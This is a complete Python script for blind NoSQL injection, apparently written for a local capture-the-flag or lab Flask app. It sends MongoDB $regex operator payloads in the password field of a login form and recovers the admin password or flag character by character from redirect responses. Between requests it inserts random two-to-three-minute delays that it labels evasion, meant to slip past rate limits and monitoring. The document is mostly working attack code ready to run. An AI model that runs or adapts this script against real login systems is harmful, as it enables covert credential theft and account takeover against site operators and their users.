import requests
import string
import sys
import time
import random

# The target URL of your vulnerable local Flask app
URL = "http://localhost:5000/login"

# The characters we want to test. 
CHARSET = string.ascii_letters + string.digits + "_{}!"

def extract_flag(target_username):
    print(f"[*] Starting 'Low and Slow' Blind NoSQL Extraction for: {target_username}")
    print("[!] WARNING: This will take hours/days to complete due to the long delays.\n")
    
    extracted_regex = "^" 
    display_password = ""
    
    while True:
        char_found = False
        
        for char in CHARSET:
            test_regex = extracted_regex + char
            payload = {
                "username": target_username,
                "password": {"$regex": test_regex}
            }
            
            try:
                # ── THE EVASION DELAY ──
                # Pick a random sleep time between 120 seconds (2m) and 180 seconds (3m)
                sleep_time = int(random.uniform(120, 180))
                
                # Visual countdown so you know the script is still alive
                for remaining in range(sleep_time, 0, -1):
                    sys.stdout.write(f"\r[*] Evasion active: Sleeping for {remaining}s before testing '{char}'...   ")
                    sys.stdout.flush()
                    time.sleep(1)
                
                # Clear the countdown line
                sys.stdout.write("\r" + " " * 80 + "\r")
                sys.stdout.flush()

                # ── THE REQUEST ──
                response = requests.post(URL, json=payload, allow_redirects=False)
                
                # If the login is successful (302 Redirect)
                if response.status_code == 302:
                    extracted_regex += char
                    display_password += char
                    
                    print(f"\n[+] HIT! Extracted so far: {display_password}\n")
                    char_found = True
                    
                    if char == "}":
                        print(f"\n[🎉] Extraction Complete!")
                        print(f"[*] The final flag is: {display_password}")
                        return
                        
                    break # Break the inner loop to start guessing the next character
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[-] Connection error: {e}")
                sys.exit(1)
                
        if not char_found:
            print(f"\n\n[-] Could not find the next character. End of string reached.")
            print(f"[*] Final extracted string: {display_password}")
            break

if __name__ == "__main__":
    extract_flag("admin")